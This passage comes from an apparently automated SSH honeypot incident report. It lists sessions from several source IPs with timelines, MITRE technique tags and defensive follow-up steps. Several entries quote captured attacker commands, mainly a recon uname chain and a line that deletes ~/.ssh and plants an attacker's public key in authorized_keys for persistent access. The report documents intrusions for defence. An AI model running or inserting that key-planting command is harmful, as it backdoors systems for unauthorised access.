| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-21 14:31:41` | `cowrie.session.connect` |
| `2026-09-21 14:31:41` | `cowrie.client.version` |
| `2026-09-21 14:31:41` | `cowrie.client.kex` |
| `2026-09-21 14:31:42` | `cowrie.login.success` |
| `2026-09-21 14:31:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `146.190.175[.]10` to AbuseIPDB if not already reported
- [ ] Block `146.190.175[.]10` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5f4a36c4f624

| Field | Detail |
|---|---|
| **Source IP** | `146.190.175[.]10` |
| **First Seen** | 2026-09-21 14:31 |
| **Last Seen** | 2026-09-21 14:31 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-21 14:31:42` | `cowrie.session.connect` |
| `2026-09-21 14:31:42` | `cowrie.client.version` |
| `2026-09-21 14:31:42` | `cowrie.client.kex` |
| `2026-09-21 14:31:42` | `cowrie.login.success` |
| `2026-09-21 14:31:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `146.190.175[.]10` to AbuseIPDB if not already reported
- [ ] Block `146.190.175[.]10` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-42cd27ed5b16

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]84` |
| **First Seen** | 2026-09-21 14:34 |
| **Last Seen** | 2026-09-21 14:35 |
| **Session Duration** | 44s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-21 14:34:33` | `cowrie.session.connect` |
| `2026-09-21 14:34:34` | `cowrie.client.version` |
| `2026-09-21 14:34:34` | `cowrie.client.kex` |
| `2026-09-21 14:34:40` | `cowrie.login.success` |
| `2026-09-21 14:34:43` | `cowrie.session.params` |
| `2026-09-21 14:34:43` | `cowrie.command.input` |
| `2026-09-21 14:34:43` | `cowrie.command.input` |
| `2026-09-21 14:34:43` | `cowrie.command.input` |
| `2026-09-21 14:34:43` | `cowrie.command.input` |
| `2026-09-21 14:34:43` | `cowrie.command.input` |
| `2026-09-21 14:34:43` | `cowrie.command.success` |
| `2026-09-21 14:34:43` | `cowrie.command.input` |
| `2026-09-21 14:34:43` | `cowrie.command.input` |
| `2026-09-21 14:34:43` | `cowrie.command.input` |
| `2026-09-21 14:34:43` | `cowrie.command.input` |
| `2026-09-21 14:34:54` | `cowrie.log.closed` |
| `2026-09-21 14:35:17` | `cowrie.session.params` |
| `2026-09-21 14:35:17` | `cowrie.command.input` |
| `2026-09-21 14:35:17` | `cowrie.log.closed` |
| `2026-09-21 14:35:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]84` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]84` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-479a1ba1f8d8

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]84` |
| **First Seen** | 2026-09-21 14:37 |
| **Last Seen** | 2026-09-21 14:38 |
| **Session Duration** | 16s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-21 14:37:49` | `cowrie.session.connect` |
| `2026-09-21 14:37:50` | `cowrie.client.version` |
| `2026-09-21 14:37:50` | `cowrie.client.kex` |
| `2026-09-21 14:37:54` | `cowrie.login.success` |
| `2026-09-21 14:37:57` | `cowrie.session.params` |
| `2026-09-21 14:37:57` | `cowrie.command.input` |
| `2026-09-21 14:37:57` | `cowrie.command.input` |
| `2026-09-21 14:37:57` | `cowrie.command.input` |
| `2026-09-21 14:37:57` | `cowrie.command.input` |
| `2026-09-21 14:37:57` | `cowrie.command.input` |
| `2026-09-21 14:37:57` | `cowrie.command.success` |
| `2026-09-21 14:37:57` | `cowrie.command.input` |
| `2026-09-21 14:37:57` | `cowrie.command.input` |
| `2026-09-21 14:37:57` | `cowrie.command.input` |
| `2026-09-21 14:37:57` | `cowrie.command.input` |
| `2026-09-21 14:37:59` | `cowrie.log.closed` |
| `2026-09-21 14:38:03` | `cowrie.session.params` |
| `2026-09-21 14:38:03` | `cowrie.command.input` |
| `2026-09-21 14:38:04` | `cowrie.log.closed` |
| `2026-09-21 14:38:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]84` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]84` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-dc4e95b96e37

| Field | Detail |
|---|---|
| **Source IP** | `43.134.49[.]202` |
| **First Seen** | 2026-09-21 14:52 |
| **Last Seen** | 2026-09-21 14:52 |
| **Session Duration** | 13s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-21 14:52:07` | `cowrie.session.connect` |
| `2026-09-21 14:52:07` | `cowrie.client.version` |
| `2026-09-21 14:52:07` | `cowrie.client.kex` |
| `2026-09-21 14:52:09` | `cowrie.login.success` |
| `2026-09-21 14:52:11` | `cowrie.session.params` |
| `2026-09-21 14:52:11` | `cowrie.command.input` |
| `2026-09-21 14:52:11` | `cowrie.command.failed` |
| `2026-09-21 14:52:11` | `cowrie.log.closed` |
| `2026-09-21 14:52:13` | `cowrie.session.params` |
| `2026-09-21 14:52:13` | `cowrie.command.input` |
| `2026-09-21 14:52:14` | `cowrie.session.file_download` |
| `2026-09-21 14:52:14` | `cowrie.log.closed` |
| `2026-09-21 14:52:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `43.134.49[.]202` to AbuseIPDB if not already reported
- [ ] Block `43.134.49[.]202` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-38cbafa1e9e5

| Field | Detail |
|---|---|
| **Source IP** | `43.134.49[.]202` |
| **First Seen** | 2026-09-21 14:52 |
| **Last Seen** | 2026-09-21 14:52 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-21 14:52:14` | `cowrie.session.connect` |
| `2026-09-21 14:52:14` | `cowrie.client.version` |
| `2026-09-21 14:52:17` | `cowrie.client.kex` |
| `2026-09-21 14:52:18` | `cowrie.login.success` |
| `2026-09-21 14:52:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `43.134.49[.]202` to AbuseIPDB if not already reported
- [ ] Block `43.134.49[.]202` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b9afb30a326d

| Field | Detail |
|---|---|
| **Source IP** | `43.134.49[.]202` |
| **First Seen** | 2026-09-21 14:52 |
| **Last Seen** | 2026-09-21 14:52 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-21 14:52:18` | `cowrie.session.connect` |
| `2026-09-21 14:52:18` | `cowrie.client.version` |
| `2026-09-21 14:52:19` | `cowrie.client.kex` |
| `2026-09-21 14:52:20` | `cowrie.login.success` |
| `2026-09-21 14:52:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `43.134.49[.]202` to AbuseIPDB if not already reported
- [ ] Block `43.134.49[.]202` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-60e9ea1abd14

| Field | Detail |
|---|---|
| **Source IP** | `150.223.20[.]12` |
| **First Seen** | 2026-09-21 14:57 |
| **Last Seen** | 2026-09-21 14:57 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-21 14:57:15` | `cowrie.session.connect` |
| `2026-09-21 14:57:15` | `cowrie.client.version` |
| `2026-09-21 14:57:16` | `cowrie.client.kex` |
| `2026-09-21 14:57:17` | `cowrie.login.success` |
| `2026-09-21 14:57:18` | `cowrie.session.params` |
| `2026-09-21 14:57:18` | `cowrie.command.input` |
| `2026-09-21 14:57:18` | `cowrie.command.failed` |
| `2026-09-21 14:57:19` | `cowrie.log.closed` |
| `2026-09-21 14:57:19` | `cowrie.session.params` |
| `2026-09-21 14:57:19` | `cowrie.command.input` |
| `2026-09-21 14:57:20` | `cowrie.session.file_download` |
| `2026-09-21 14:57:20` | `cowrie.log.closed` |
| `2026-09-21 14:57:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `150.223.20[.]12` to AbuseIPDB if not already reported
- [ ] Block `150.223.20[.]12` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-afa79055a498

| Field | Detail |
|---|---|
| **Source IP** | `150.223.20[.]12` |
| **First Seen** | 2026-09-21 14:57 |
| **Last Seen** | 2026-09-21 14:57 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-21 14:57:20` | `cowrie.session.connect` |
| `2026-09-21 14:57:20` | `cowrie.client.version` |
| `2026-09-21 14:57:20` | `cowrie.client.kex` |
| `2026-09-21 14:57:21` | `cowrie.login.success` |
| `2026-09-21 14:57:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `150.223.20[.]12` to AbuseIPDB if not already reported
- [ ] Block `150.223.20[.]12` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4fe19cf7094b

| Field | Detail |
|---|---|
| **Source IP** | `150.223.20[.]12` |
| **First Seen** | 2026-09-21 14:57 |
| **Last Seen** | 2026-09-21 14:57 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-21 14:57:23` | `cowrie.session.connect` |
| `2026-09-21 14:57:23` | `cowrie.client.version` |
| `2026-09-21 14:57:23` | `cowrie.client.kex` |
| `2026-09-21 14:57:25` | `cowrie.login.success` |
| `2026-09-21 14:57:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `150.223.20[.]12` to AbuseIPDB if not already reported
- [ ] Block `150.223.20[.]12` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3fcbda64222c

| Field | Detail |
|---|---|
| **Source IP** | `118.194.249[.]72` |
| **First Seen** | 2026-09-21 15:27 |
| **Last Seen** | 2026-09-21 15:28 |
| **Session Duration** | 18s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-21 15:27:57` | `cowrie.session.connect` |
| `2026-09-21 15:27:57` | `cowrie.login.success` |
| `2026-09-21 15:27:57` | `cowrie.session.params` |
| `2026-09-21 15:28:15` | `cowrie.log.closed` |
| `2026-09-21 15:28:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `118.194.249[.]72` to AbuseIPDB if not already reported
- [ ] Block `118.194.249[.]72` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0c26e8ae7594

| Field | Detail |
|---|---|
| **Source IP** | `118.194.249[.]72` |
| **First Seen** | 2026-09-21 15:28 |
| **Last Seen** | 2026-09-21 15:28 |
| **Session Duration** | 18s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `Accept-Language: zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6, User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0[.]0 Safari/537.36 Edg/120.0.0[.]0` |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-21 15:28:34` | `cowrie.session.connect` |
| `2026-09-21 15:28:34` | `cowrie.login.success` |
| `2026-09-21 15:28:34` | `cowrie.session.params` |
| `2026-09-21 15:28:34` | `cowrie.command.input` |
| `2026-09-21 15:28:34` | `cowrie.command.failed` |
| `2026-09-21 15:28:34` | `cowrie.command.input` |
| `2026-09-21 15:28:34` | `cowrie.command.input` |
| `2026-09-21 15:28:53` | `cowrie.log.closed` |
| `2026-09-21 15:28:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `118.194.249[.]72` to AbuseIPDB if not already reported
- [ ] Block `118.194.249[.]72` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6ef3a1f42a12

| Field | Detail |
|---|---|
| **Source IP** | `118.194.249[.]72` |
| **First Seen** | 2026-09-21 15:28 |
| **Last Seen** | 2026-09-21 15:29 |
| **Session Duration** | 18s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-21 15:28:53` | `cowrie.session.connect` |
| `2026-09-21 15:28:53` | `cowrie.login.success` |
| `2026-09-21 15:29:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `118.194.249[.]72` to AbuseIPDB if not already reported
- [ ] Block `118.194.249[.]72` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-06c27581d554

| Field | Detail |
|---|---|
| **Source IP** | `103.70.40[.]36` |
| **First Seen** | 2026-09-21 15:51 |
| **Last Seen** | 2026-09-21 15:51 |
| **Session Duration** | 21s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-21 15:51:37` | `cowrie.session.connect` |
| `2026-09-21 15:51:37` | `cowrie.client.version` |
| `2026-09-21 15:51:37` | `cowrie.client.kex` |
| `2026-09-21 15:51:39` | `cowrie.login.success` |
| `2026-09-21 15:51:41` | `cowrie.session.params` |
| `2026-09-21 15:51:41` | `cowrie.command.input` |
| `2026-09-21 15:51:41` | `cowrie.command.failed` |
| `2026-09-21 15:51:43` | `cowrie.log.closed` |
| `2026-09-21 15:51:44` | `cowrie.session.params` |
| `2026-09-21 15:51:44` | `cowrie.command.input` |
| `2026-09-21 15:51:45` | `cowrie.session.file_download` |
| `2026-09-21 15:51:45` | `cowrie.log.closed` |
| `2026-09-21 15:51:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.70.40[.]36` to AbuseIPDB if not already reported
- [ ] Block `103.70.40[.]36` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-226511ce2876

| Field | Detail |
|---|---|
| **Source IP** | `103.70.40[.]36` |
| **First Seen** | 2026-09-21 15:51 |
| **Last Seen** | 2026-09-21 15:51 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-21 15:51:45` | `cowrie.session.connect` |
| `2026-09-21 15:51:45` | `cowrie.client.version` |
| `2026-09-21 15:51:46` | `cowrie.client.kex` |
| `2026-09-21 15:51:49` | `cowrie.login.success` |
| `2026-09-21 15:51:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.70.40[.]36` to AbuseIPDB if not already reported
- [ ] Block `103.70.40[.]36` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fc119e658242

| Field | Detail |
|---|---|
| **Source IP** | `103.70.40[.]36` |
| **First Seen** | 2026-09-21 15:51 |
| **Last Seen** | 2026-09-21 15:51 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-21 15:51:53` | `cowrie.session.connect` |
| `2026-09-21 15:51:53` | `cowrie.client.version` |
| `2026-09-21 15:51:56` | `cowrie.client.kex` |
| `2026-09-21 15:51:58` | `cowrie.login.success` |
| `2026-09-21 15:51:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.70.40[.]36` to AbuseIPDB if not already reported
- [ ] Block `103.70.40[.]36` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f72c7eaa14e0

| Field | Detail |
|---|---|
| **Source IP** | `77.90.185[.]17` |
| **First Seen** | 2026-09-21 16:03 |
| **Last Seen** | 2026-09-21 16:03 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-21 16:03:39` | `cowrie.session.connect` |
| `2026-09-21 16:03:39` | `cowrie.client.version` |
| `2026-09-21 16:03:39` | `cowrie.client.kex` |
| `2026-09-21 16:03:40` | `cowrie.login.success` |
| `2026-09-21 16:03:42` | `cowrie.direct-tcpip.request` |
| `2026-09-21 16:03:42` | `cowrie.direct-tcpip.ja4` |
| `2026-09-21 16:03:42` | `cowrie.direct-tcpip.data` |
| `2026-09-21 16:03:43` | `cowrie.direct-tcpip.request` |
| `2026-09-21 16:03:43` | `cowrie.direct-tcpip.ja4` |
| `2026-09-21 16:03:43` | `cowrie.direct-tcpip.data` |
| `2026-09-21 16:03:44` | `cowrie.direct-tcpip.request` |
| `2026-09-21 16:03:45` | `cowrie.direct-tcpip.ja4` |
| `2026-09-21 16:03:45` | `cowrie.direct-tcpip.data` |
| `2026-09-21 16:03:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `77.90.185[.]17` to AbuseIPDB if not already reported
- [ ] Block `77.90.185[.]17` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bd84a4ef943a

| Field | Detail |
|---|---|
| **Source IP** | `77.90.185[.]17` |
| **First Seen** | 2026-09-21 16:13 |
| **Last Seen** | 2026-09-21 16:13 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-21 16:13:52` | `cowrie.session.connect` |
| `2026-09-21 16:13:52` | `cowrie.client.version` |
| `2026-09-21 16:13:52` | `cowrie.client.kex` |
| `2026-09-21 16:13:53` | `cowrie.login.success` |
| `2026-09-21 16:13:55` | `cowrie.direct-tcpip.request` |
| `2026-09-21 16:13:55` | `cowrie.direct-tcpip.ja4` |
| `2026-09-21 16:13:55` | `cowrie.direct-tcpip.data` |
| `2026-09-21 16:13:56` | `cowrie.direct-tcpip.request` |
| `2026-09-21 16:13:57` | `cowrie.direct-tcpip.ja4` |
| `2026-09-21 16:13:57` | `cowrie.direct-tcpip.data` |
| `2026-09-21 16:13:57` | `cowrie.direct-tcpip.request` |
| `2026-09-21 16:13:58` | `cowrie.direct-tcpip.ja4` |
| `2026-09-21 16:13:58` | `cowrie.direct-tcpip.data` |
| `2026-09-21 16:13:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `77.90.185[.]17` to AbuseIPDB if not already reported
- [ ] Block `77.90.185[.]17` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d327635eb9fd

| Field | Detail |
|---|---|
| **Source IP** | `49.229.102[.]187` |
| **First Seen** | 2026-09-21 16:25 |
| **Last Seen** | 2026-09-21 16:25 |
| **Session Duration** | 11s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-21 16:25:47` | `cowrie.session.connect` |
| `2026-09-21 16:25:47` | `cowrie.client.version` |
| `2026-09-21 16:25:47` | `cowrie.client.kex` |
| `2026-09-21 16:25:49` | `cowrie.login.success` |
| `2026-09-21 16:25:50` | `cowrie.session.params` |
| `2026-09-21 16:25:50` | `cowrie.command.input` |
| `2026-09-21 16:25:50` | `cowrie.command.failed` |
| `2026-09-21 16:25:51` | `cowrie.log.closed` |
| `2026-09-21 16:25:52` | `cowrie.session.params` |
| `2026-09-21 16:25:52` | `cowrie.command.input` |
| `2026-09-21 16:25:52` | `cowrie.session.file_download` |
| `2026-09-21 16:25:52` | `cowrie.log.closed` |
| `2026-09-21 16:25:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `49.229.102[.]187` to AbuseIPDB if not already reported
- [ ] Block `49.229.102[.]187` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-37452bd77a65

| Field | Detail |
|---|---|
| **Source IP** | `49.229.102[.]187` |
| **First Seen** | 2026-09-21 16:25 |
| **Last Seen** | 2026-09-21 16:25 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-21 16:25:53` | `cowrie.session.connect` |
| `2026-09-21 16:25:53` | `cowrie.client.version` |
| `2026-09-21 16:25:53` | `cowrie.client.kex` |
| `2026-09-21 16:25:55` | `cowrie.login.success` |
| `2026-09-21 16:25:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `49.229.102[.]187` to AbuseIPDB if not already reported
